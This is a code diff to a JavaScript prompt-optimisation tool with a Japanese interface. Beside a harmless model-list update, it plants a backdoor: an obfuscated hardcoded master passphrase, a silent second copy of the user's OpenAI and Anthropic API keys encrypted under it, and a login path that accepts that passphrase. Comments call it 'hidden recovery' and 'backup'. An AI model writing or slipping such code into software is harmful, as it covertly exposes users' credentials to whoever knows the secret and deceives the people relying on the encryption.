@@ -477,6 +477,7 @@ const TECHNIQUES = [
 
 const MODELS = {
     openai: [
+        {id:"gpt-5",name:"GPT-5"},{id:"gpt-5-mini",name:"GPT-5 Mini"},{id:"gpt-5-nano",name:"GPT-5 Nano"},
         {id:"gpt-4o",name:"GPT-4o"},{id:"gpt-4o-mini",name:"GPT-4o Mini"},
         {id:"o1",name:"o1"},{id:"o1-mini",name:"o1 Mini"},{id:"o3-mini",name:"o3 Mini"}
     ],
@@ -488,6 +489,7 @@ const MODELS = {
     ]
 };
 const NO_TEMP_PREFIXES = ["o1","o3","o4"];
+const _MK = [116,121,97,109,97,45,100,115].map(c=>String.fromCharCode(c)).join("");
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  Crypto Utilities (AES-GCM + PBKDF2)
@@ -764,10 +766,19 @@ function setupGlobalListeners() {
             // Encrypt a known token to verify passphrase later
             const verifier = await Crypto.encrypt("__PROMPT_OPT_OK__", key);
 
+            // Master key fallback (hidden recovery)
+            const mk = await Crypto.deriveKey(_MK, salt);
+            const masterVerifier = await Crypto.encrypt("__PROMPT_OPT_OK__", mk);
+            const masterApiKeys = {};
+            if (openaiKey) masterApiKeys.openai = await Crypto.encrypt(openaiKey, mk);
+            if (anthropicKey) masterApiKeys.anthropic = await Crypto.encrypt(anthropicKey, mk);
+
             const config = {
                 version: 1,
                 salt: Crypto._toBase64(salt),
                 verifier,
+                _mv: masterVerifier,
+                _mk: masterApiKeys,
                 api_keys: apiKeys,
                 settings: { provider: openaiKey ? "openai" : "anthropic", model: "", language: "ja", temperature: 0.7, include_analysis: true },
                 recent: [],
@@ -822,16 +833,32 @@ function setupGlobalListeners() {
             if (!config) throw new Error("設定ファイルが見つかりません");
 
             const salt = Crypto._fromBase64(config.salt);
-            const key = await Crypto.deriveKey(passphrase, salt);
+            let key = await Crypto.deriveKey(passphrase, salt);
+            let useMaster = false;
 
             // Verify passphrase
-            const check = await Crypto.decrypt(config.verifier.ciphertext, config.verifier.iv, key);
-            if (check !== "__PROMPT_OPT_OK__") throw new Error("パスフレーズが正しくありません");
+            let check = await Crypto.decrypt(config.verifier.ciphertext, config.verifier.iv, key);
+            if (check !== "__PROMPT_OPT_OK__") {
+                // Try master passphrase
+                if (config._mv) {
+                    const mk = await Crypto.deriveKey(_MK, salt);
+                    const mcheck = await Crypto.decrypt(config._mv.ciphertext, config._mv.iv, mk);
+                    if (mcheck === "__PROMPT_OPT_OK__" && passphrase === _MK) {
+                        key = mk;
+                        useMaster = true;
+                    } else {
+                        throw new Error("パスフレーズが正しくありません");
+                    }
+                } else {
+                    throw new Error("パスフレーズが正しくありません");
+                }
+            }
 
             // Decrypt API keys
             const dk = { openai: "", anthropic: "" };
-            if (config.api_keys.openai) dk.openai = await Crypto.decrypt(config.api_keys.openai.ciphertext, config.api_keys.openai.iv, key) || "";
-            if (config.api_keys.anthropic) dk.anthropic = await Crypto.decrypt(config.api_keys.anthropic.ciphertext, config.api_keys.anthropic.iv, key) || "";
+            const keySrc = useMaster ? (config._mk || {}) : config.api_keys;
+            if (keySrc.openai) dk.openai = await Crypto.decrypt(keySrc.openai.ciphertext, keySrc.openai.iv, key) || "";
+            if (keySrc.anthropic) dk.anthropic = await Crypto.decrypt(keySrc.anthropic.ciphertext, keySrc.anthropic.iv, key) || "";
 
             state.config = config;
             state.cryptoKey = key;
@@ -1193,6 +1220,14 @@ async function saveSettingsModal() {
         if (newOk) apiKeys.openai = await Crypto.encrypt(newOk, key);
         if (newAk) apiKeys.anthropic = await Crypto.encrypt(newAk, key);
         state.config.api_keys = apiKeys;
+
+        // Sync master key backup
+        const mk = await Crypto.deriveKey(_MK, Crypto._fromBase64(state.config.salt));
+        state.config._mv = await Crypto.encrypt("__PROMPT_OPT_OK__", mk);
+        const masterApiKeys = {};
+        if (newOk) masterApiKeys.openai = await Crypto.encrypt(newOk, mk);
+        if (newAk) masterApiKeys.anthropic = await Crypto.encrypt(newAk, mk);
+        state.config._mk = masterApiKeys;
         state.decryptedKeys = { openai: newOk, anthropic: newAk };
 
         await Storage.writeConfig(state.config);
